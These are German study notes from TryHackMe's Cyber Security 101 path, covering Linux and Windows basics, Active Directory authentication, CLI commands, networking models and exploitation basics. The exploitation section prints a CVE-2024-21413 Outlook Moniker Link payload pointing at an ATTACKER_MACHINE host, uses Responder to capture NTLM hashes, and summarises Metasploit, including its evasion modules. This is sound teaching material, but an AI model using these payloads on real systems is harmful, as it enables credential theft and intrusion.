# Cyber Security 101
Diese Datei enthält die Informationen und Erkenntnisse aus dem _Cyber Security 101_-Path von TryHackMe.
## Schnellreferenz
- [Security Intro](#security-intro)
- [Linux Fundamentals](#linux-fundamentals)
- [Windows Fundamentals](#windows-fundamentals)
- [Command Line](#command-line)
- [Networking](#networking)
- [Exploitation Basics](#exploitation-basics)

## Security Intro

_SOC_ steht für Security Operations Center. Dies ist ein Team von IT Security Professionals, welche Die Aufgabe haben, Threats zu  monitoren, verhindern , erkennen , untersuchen, und darauf zu reagieren.<br>
_Threat Intelligence_ steht für das Teilen von Informationen über Angreifer.

### Tools
_Shodan_ ist eine Suchmaschine für IoT-Geräte bzw. für alles, was öffentlich mit Internet läuft. Mit dieser Suchmaschine kann nach Devices mit bestimmten Eigenschaften gesucht werden. Dafür kann nach country, port, org, hostname uvm.  gefiltert werden.<br>
_VirusTotal_ nutzt mehr als 70 Antiviren-Engines & Website Scanners, mit denen man Dateien, URL, Domänen oder File Hashes scannen kann.<br>
_CVE_ steht für _Common Vulnerabilities and Exposures_ und ist quasi ein Nachschlagewerk bekannter Schwachstellen. Eine CVE besteht aus Name (CVE-YEAR-NUMBER) und CVSS Score (gibt Impact, Complexity & Availability an, um das Risk Level zu bestimmen). Diese Informationen sind in der _ExploitDB_ angegeben, auch bei Proof of Concepts (PoCs).

## Linux Fundamentals
`wget URL` to download File from _URL_ <br>
`/webserver# python3 -m http.server` to start a webserver on the machine -> can download via _wget_<br>
`systemctl OPTION SERVICE` zum Interagieren mit dem systemd Prozess. Dabei wird OPTION ersetzt mit: _start_, _stop_, _enable_, _disable_ oder _status_. _SERVICE_ steht für den Namen des entsprechenden Services

### Cron
Man kann via`crontab` eine Automatisierung auf dem System einrichten. Dabei wird dann nach folgendem Schema ein Eintrag angelegt:<br>
`MIN HOUR DOM MON DOW CMD`<br>
_MIN_ steht für die Minuten, wann es ausgeführt werden soll<br>
_HOUR_ steht für die Stunden, wann es ausgeführt werden soll<br>
_DOM_ steht für _Day of Month_, also wann es im Monat ausgeführt werden soll<br>
_MON_ steht für den Monat, wann es ausgeführt werden soll<br>
_DOW_ steht für _Day of Week_, also an welchem Wochentag es ausgeführt werden soll<br>
_CMD_ steht für den Befehl, der durch die Automatisierung ausgeführt werden soll<br>
Dabei ist `*` eine wildcard für die ersten fünf Optionen, also wenn diese nicht konkret gesetzt werden. <br>
Ein Beispiel: `0 */12 * * * echo "12 hours have passed"` Dieser Eintrag führt dazu, dass aller 12 Stunden "12 hours have passed" ausgegeben wird, unabhängig vom Wochen- oder Monatstag<br>

## Windows Fundamentals
System Variable für System32-Ordner: `%windir%`<br>
_UAC_ steht für _User Account Control_<br>
_Ctrl+Shift+Esc_ öffnet Task Manager <br>
_TPM_ steht für _Trusted Platform Module_ ist eine Technologie, welche Hardware-basierte, sicherheitsbezogene Funktionen bereitstellt. Ein TPM Chip ist ein sicherer Krypto-Prozessor, der kryptografische Operationen ausführt. Dieser besitzt mehrere physische Sicherheitsmechanismen, um Manipulation zu verhindern.<br>
_Volume Shadow Copy Serbice (VSS)_ ist ein konsistenter Snapshot von Daten.<br>
_Active Directory (AD)_ ist ein  Repository zum zentralisierten Administrieren von einem Windows Computer Netzwerk. Der Server, der das Repo ausführt, heißt _Domain Controller (DC)_.<br>
Im AD gibt es _Organizational Units (OUs)_, um die Objekte des Netzwerkes besser zu organisieren. Mit Hilfe des ADs können gewisse Controls an andere Objekte delegiert werden, z.B. dass bestimmte User andere User verwalten dürfen, um bei diesen bei Problemen z.B. das Passwort zurück zu setzen, was für IT Support einer Firma sehr wichtig ist.<br>
_Group Policy Objects (GPO)_ dient zum Anwenden verschiedener Policies für OUs, sodass man dies nicht alles einzeln manuell machen muss. Es gibt auch eine Default Domain Policy, welche den Bedürfnissen angepasst werden kann. GPOs werden über das Netzwerk via _SYSVOL_ geteilt.<br>
Bei Windows Domänen werden Credentials in Domain Controllern gespeichert. Beim Login muss via Service beim Domain Controller angefragt werden, ob die Credentials passen. Für diese Netzwerk Authentication gibt es zwei Protokolle: Kerberos (default) und NetNTLM (legacy). <br>
### Authentication mit Kerberos:<br>
- Username und encrypteter Timestamp, welche mit einem Key, der vom Passwort abgeleitet wurde, verschlüsselt wurde, werden an das Key Distribution Center (KDC) gesendet. Dieses sendet ein Ticket Granting Ticket (TGT) zurück, wodurch weitere Anfragen für spezifische Services möglich sind. Zusätzlich wird auch ein Session key gesendet.
- Ticket Granting Service (TGS) für das Verbinden zu einem Netzwerkservice, z.B eine Website oder DB. Für den Request für das TGS muss der User wieder Username, encrypted Timestamp, sowie das TGT und einen Service Principal Name (SPN) senden. Der SPN gibt an, welcher Service beabsichtigt ist, sowie der entsprechende Server Name.
### Authentication mit NetNTLM
nutzt ein Challenge-Response Mechanismus:
1. Client sendet eine Authentifizierungsanfrage an den Server.
2. Server erzeugt eine Zufallszahl (Challenge) und sendet sie an den Client.
3. Client kombiniert den NTLM-Passwort-Hash mit der Challenge und sendet die daraus entstandene Response an den Server.
4. Server leitet Challenge und Response zur Prüfung an den Domain Controller weiter.
5. Der Domain Controller berechnet die erwartete Response neu und vergleicht sie mit der des Clients: stimmen sie überein, ist die Authentifizierung erfolgreich.
6. Das Ergebnis wird an den Server und anschließend an den Client zurückgegeben.
### Trees
Wenn einzelne Domäne nicht mehr ausreicht, legt man mehrere Domänen an und verknüpft sie als Tree.
### Forests
Wenn man mehrere Trees miteinander verknüpft, nennt man es Forest.

## Command Line
### Windows
#### CMD
`set` zeigt welche Pfade für die CMD Commands hinterlegt sind<br>
`ver` zeigt die Windows Version<br>
`systeminfo` zeigt Systeminformationen an<br>
Wenn ein Output im CMD zu lang ist, kann man `CommandDerLangenOutputGeneriert | more` ausführen, wodurch der Output dann seitenweise angezeigt wird.<br>
`cls` cleared tden CMD Screen<br>
`ipconfig /all` zeigt Informationen betreffend des Netzwerks des Systems an<br>
`ping TARGET` prüft die Erreichbarkeit von _TARGET_, wobei dies eine IP-Adresse oder einer URL sein kann<br>
`tracert TARGET` zeigt die Route zum Ziel _TARGET_, inklusive alle Zwischenpunkte<br>
`nslookup URL` zeigt die entsprechenden Adressen und Servernamen von der angegebenen _URL_ an<br>
`netstat` zeigt aktuelle Verbindungen und listening ports des Systems an. Dabei gibt es noch folgende Parameter: `-a` zeigt alle laufenden Verbindungen und listening ports, `-b` zeigt die jeweils dazugehörigen Programme, `-o` zeigt jeweils die Prozess-ID (PID) zu den Verbindungen, `-n` nutzt eine numerische Form für Adressen und Port-Nummern. Man kann es auch verbinden zu `netstat -abon`<br> 
`dir /a` zeigt versteckte und Systemfiles an<br>
`dir /s` zeigt Files im aktuellen Verzeichnis und allen Unterverzeichnissen an<br>
`tree` zeigt alle Kind-Verzeichnisse und Unterverzeichnisse visuell an<br>
`type FILE` zeigt den Inhalt des angegeben _FILES_ an<br>
`copy SOURCE DESTINATION` kopiert von _SOURCE_ nach _DESTINATION_, analog verschieben mit `move`<br>
`del FILE` oder `erase FILE` zum Löschen von _FILE_ 
`tasklist` zeigt alle aktuell laufenden Prozesse an. Mittels `tasklist /FI "imagename eq sshd.exe"` Kann man bei den laufenden Prozessen nach Prozessen Filtern, welche den Image Name _sshd.exe_ haben.<br>
#### Powershell
Powershell nutzt _cmdlets_, was für _command-lets_ steht. Diese sind nach dem Schema _VerbSubstantiv_ aufgebaut und sind umfangreicher als normale Windows Commands, da sie z.B: erweiterte Datenänderungen ermöglichen.
`Get-Content` holt den Inhalt der angegebenen Datei und zeigt ihn an<br> 
`Set-Location` ändert das aktuelle Arbeitsverzeichnis entsprechend des angegebenen Pfades<br>
`Get-Command` zeigt alle vorhandenen Befehle an. Dies kann noch durch den Zusatz `-CommandType "Function"` gefiltert werden, sdoass es nur noch Befehle anzeigt, die vom Typ _Function_ sind<br>
`Get-Help COMMAND` zeigt die Hilfe zum Befehl _COMMAND_ an. Mit der Erweiterung `-examples` wird diese Information noch um Beispiele ergänzt<br>
`Find-Module -Name "PowerShell*` nutzen, um Online nach CmdLets zu suchen, deren Namen mit _PowerShell_ beginnt<br>
Im Anschluss kann das gefundene CmdLets via `Install-Module -Name "NAME"` installiert werden.
`Get-ChildItem` zeigt, analog zu _dir_ (CMD) bzw. _ls_ (Unix-basiert), Dateien und Verzeichnisse vom im _-Path_ spezifizierten Verzeichnis. Ist dies nicht gesetzt, wird das aktuelle Arbeitsverzeichnis genutzt<br>
`New-Item -Path "PATH" -ItemType "Directory"` erzeigt ein neues Verzeichnis am angegebenen Pfad _PATH_<br>
`Remove-Item -Path "PATH"` löscht das Item an der Stelle _PATH_<br>
`Copy-Item -Path "PATH" -Destination "PATH2"` kopiert die Datei von _PATH_ nach _PATH2_<br>
Piping funktioniert, analog zu UNIX-basierten Systemen, mittels `CmdLets1 | CmdLets2`<br>
`Sort-Object Length` sortiert entsprechend der Länge (Größe)<br>
`Where-Object -Property "Extension" -eq "STRING"` sucht nach Objekten, die die angegebene Bedingung erfüllen, in diesem Fall wird nach Dateien gesucht, dessen Endungen (Extension) _STRING_ entsprechen. Es gibt _-ne_ als _not equal_, _-gt_ als _greater than_, _-ge_ als _greater than or equal_, _-lt_ als _less than_ und _le_ als _less than or equal_ <br>
`Select-Object Name, Length` zeigt nur die angegebenen Eigenschaften, in diesem Fall Name und Größe<br>
`Select-String - Path "PATH" -Pattern "STRING"` sucht an der Location _PATH_ in Dateien nach _STRING_<br>
`Get-ComputerInfo` zeigt die Systeminformationen an<br>
`Get-LocalUser` zeigt alle lokal vorhandenen User an<br>
`Get-netIPConfiguration` zeigt detaillierte Informationen über die Netzwerkschnittstellen des Systems an<br>
`Get-NetIPAddress` zeigt spezifische Informationen über die IP Adressen des Systems an<br>
`Get-Process` zeigt übersichtlich Details zu allen laufenden Prozessen an <br>
`Get-Service` zeigt Status aller Services auf dem System an, also ob running, stopped oder paused<br>
`Get-NetTCPConnection` zeigt aktuelle TCP Verbindungen an<br>
`Get-FileHash -Path "PATH"` erzeugt den Hashwert der in _PATH_ spezifizierten Datei an<br>
`Invoke-Command` erlaubt remote management und automation, z.B. `Invoke-Command -ComputerName "NAME" -ScriptBlock {SCRIPT}` führt die Befehle in _SCRIPT_ auf dem Computer namens _NAME_ remote aus<br>
### Linux
gibt verschiedene Shells, z.B. `/bin/bash` und `/usr/bin/zsh` und _Fish_, permanent änderbar mittels `chsh -s PATH`, wobei Path den Pfad zur entsprechende Shell angibt
`history` zeigt alle vergangenen Befehle an
Eine Loop in einem Skript sieht wie folgt aus:
```
for i in {1..10};
do
echo $i
done
```

## Networking
### OSI Modell

| Layer Number | Layer Name | Main Function | Example Protocols and Standards |
|---|---|---|---|
| 7 | Application layer | Providing services and interfaces to applications | HTTP, FTP, DNS, POP3, SMTP, IMAP |
| 6 | Presentation layer | Data encoding, encryption, and compression | Unicode, MIME, JPEG, PNG, MPEG |
| 5 | Session layer | Establishing, maintaining, and synchronising sessions | NFS, RPC |
| 4 | Transport layer | End-to-end communication and data segmentation | UDP, TCP |
| 3 | Network layer | Logical addressing and routing between networks | IP, ICMP, IPSec |
| 2 | Data link layer | Reliable data transfer between adjacent nodes | Ethernet (802.3), Wi-Fi (802.11) |
| 1 | Physical layer | Physical data transmission media | Electrical, optical, and wireless signals |


### TCP/IP Modell
| TCP/IP Model  | ISO OSI Layers Covered | Protocols |
|---|---|---|
| Application Layer | 7 Application, 6 Presentation, 5 Session | HTTP, HTTPS, FTP, POP3, SMTP, IMAP, Telnet, SSH |
| Transport Layer | 4 Transport | TCP, UDP |
| Internet Layer | 3 Network | IP, ICMP, IPSec |
| Link Layer | 2 Data Link | Ethernet 802.3, Wi-Fi 802.11 |
(Physical) | (1 Physical)

### IP Adresse
.0 ist die Netzwerkadresse<br>
.255 ist die Broadcastadresse <br>
Ein Subnetz ist eine Unterteilung des Netzwerkes<br> 

Befehle, um die dem Gerät zugewiesene IP-Adresse zu ermitteln:
`ipconfig`,  `ifconfig` oder  `ip address show` bzw `ip a s`

Private IP-Bereiche: _10.0.0.0 - 10.255.255.255 (10/8), 172.16.0.0 - 172.31.255.255 (172.16/12)_ und _192.168.0.0 - 192.168.255.255 (192.168/16)_

### Transportprotokolle
_UDP_ steht für User Datagram Protocol. Dies ist ein verbindungsloses Protokoll auf Transportschicht, wobei  verbindungslos heißt, dass es keine Verbindung aufbauen muss, weshalb es nicht weiß, ob die übertragenene Daten angekommen sind. Dadurch ist die Übertragung jedoch auch schneller. Für UDP ist die Portnummer nötig, welche eine Nummer bestehend aus 16 Bits ist.

_TCP_ steht für Transmition Control Protocol und ist ein verbindungsorientiertes Transport Protokoll. Somit stellt es sicher, dass die übertragenen Daten angekommen sind. Für diesen Zweck haben die Daten eine Sequenznummer. Für den Verbindungsaufbau wird der 3-Way Handshake verwendet, bestehend aus SYN, SYN-ACK und ACK. Auch dieses Protokoll nutzt eine Portnummer.


Encapsulation bedeutet in diesem Kontext, dass die zu übertragenden Daten je Schicht Header (& teilweise Trailer) hinzugefügt bekommen, wie folgende Darstellung veranschaulicht.
1.									    					          Application Data
2.								    		      TCP/UDP Header	| Application Data
3. 							        IP Header 	| TCP/UDP Header	| Application Data
4.      Eathernet/Wi-Fi Header	|   IP Header 	| TCP/UDP Header	| Application Data	| Ethernet/Wi-Fi Trailer

_Application data_ sind die Daten, die der Nutzer eingibt, um sie mit der Anwendung zu senden. Die Anwendung formatiert diese Daten und fängt an die Daten konform mit dem genutzten Applikationsprotokoll zu senden, mittels des Transportlayers.<br>
_Transport protocol segment bzw. datagram_: Das Transportlayer fügt die entsprechenden Header Infromationen hinzu und erzeugt das TCP Segment bzw. das UDP Datagram. Dies wird dann an das Networklayer gesendet.<br>
_Network packet_: Das Networklayer fügt einen IP Header vor das TCP Segment bzw UDP Datagram ein und sendet es danach an das Data-Link-Layer.<br>
_Data link frame_: Das Ethernet oder das Wi-Fi empfängt das IP Paket und fügt den entsprechenden Header und Trailer an, welche einen Rahmen bilden.

_Telnet_ steht für Teletype Network Protocol und ist ein Protokoll für Remote Terminal Connection. Bei diesem Protokoll werden alle Daten in Klartext versendet, nicht wie bei SSH verschlüsselt.

## Exploitation Basics

### Moniker Link
_Moniker Links_ sind Links, welche spezielle Anwendungen öffnen<br>
im Normalfall kommt bei Outlook beim Öffnen eines Moniker Links eine Sicherheitswarnung (Protected View)<br>
CVE-2024-21413 umgeht dies jedoch

#### Vorgehen
in einer Mail ist folgender Code:
`<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>`<br>
der Exploit funktioniert mittels des `!`, wodurch die Protected View umgangen wird und das File versucht wird zu laden <br> 
der Angreifer startet den Befehl `responder -I ens5` und wartet, dass das Victim den Link klickt. Wenn das Victim den Link geklickt hat, erhält der Angreifer den netNTLMv2 Hash<br>

### Metasploit
Metasploit ist ein Exploitation Framework<br>
es gibt zwei Metasploit Versionen, Pro & Framework<br>

#### Hauptkomponenten
1. _msfconsole_ ist die Kommandozeile
2. _Modules_ sind unterstützende Module wie Exploits, Scanner, Payloads<br>
3. _Tools_ sind Standalone-Tools

#### Begriffe
Ein _Exploit_ ist ein Codestück, dass eine Vulnerability auf Zielsystem ist<br>
Eine _Vulnerability_ ist ein Design-, Code- oder logischer Fehler, welcher das Zielsystem beeinflusst. Durch Ausnutzen der Vulnerability können vertrauliche Informationen Preis gegeben werden oder Code-Ausführung für den Angreifer auf dem Zielsystem ermöglicht werden<br>
Eine _Payload_ bedeutet, dass ein Exploit eine Vulnerability ausnutzt. Damit das gewünschte Ergebnis erzielt werden kann, ist die Payload nötig. Somit ist eine Payload Code, der auf Zielsystem ausgeführt wird.<br>

#### Module
1. _Auxiliary_ sind unterstützende Module
2. _Encoders_ encoden Exploit & Payload, damit Virenscanner die Signaturen nicht erkennen
3. _Evasion_ sind für direktes Umgehen von Virenscannern
4. _Exploits_ sind Exploits, die nach Zielsystemen organsiert sind
5. _NOPs_ <b>No OP</b>eration sind Buffer, um die Payload Size bewusst zu steuern
6. _Payloads_ s.o.; Payloads werden unterteilt in _adapters_ (wrapped Payload in verschiedene Formate), _Singles_ (sind self-contained Payloads), _Stagers_ (stellen Verbindung zwische Metasploit & Zielsystem her) und _Stages_ (werden von Stager runtergeladen und sind für größere Payloads)
7. _POST_ sind für post-Exploitation

#### wichtige Informationen
Auf msfconsole sind keine Output redirects möglich<br>
`show` + entsprechender MODULE-Type zeigt verfügbare Module in dem Bereich<br>
Module auswählen via `use PATH/2/EXPLOIT`<br>
Kontext verlassen via `back`<br>
innerhalb Module mehr Kontext erfahren via `info` oder `info /PATH/2EXPLOIT`<br>
`search SUCHBEGRIFF` sucht in Metasploit Framework DB nach SUCHBEGRIFF<br>
search-Parameter: `search type TYP SUCHBEGRIFF` beschränkt die Suche nach SUCHBEGRIFF auf Begriffe mit dem entsprechenden Typ TYP, z.B. Auxiliary<br>
`show options` zeigt Options für das konkrete Modul an<br>
_meterpreter_ ist eine wichtige Payload und hat eine eigene Commandline<br>
_RHOST_ steht für remote Host und ist die IP des Zielsystems<br>
_RPORT_ steht für remote Port und ist der Port für die Vulnerability auf dem Zielsystem<br>
_LHOST_ steht für Localhost und ist die IP des Angreifers<br>
_LPORT_ steht für local Port und ist der Port beim Angreifer für die Connection zum Ziel<br>
_SESSION_ steht für Session-ID und ist für post-Exploitation zum re-connecten<br>
`unset all` setzt alle gesetzten Parameter zurück, `unset` setzt einzelne zurück<br>
`setg` setzt Werte globale für alle Module<br>
`nsetg` löscht alle Werte, auch global<br>

ein Modul kann man  via "exploit" oder "run" ausführen<br>
`exploit -z` startet die Ausführung im Hintergrund<br>
manche Module unterstützen `check`. Dies dient zum Prüfen, ob das Zielsystem unsicher ist, ohne es direkt anzugreifen<br>
`background` wird verwendet, um aus anderen Kontexten (z.B. meterpreter) zurück zu _msfconsole_ ODER Strg+Z<br>
`sessions` zeigt alle aktuellen Sessions an<br>
`session -i SESSIONID` zum fortsetzen der Session mit der Id SESSIONID<br>

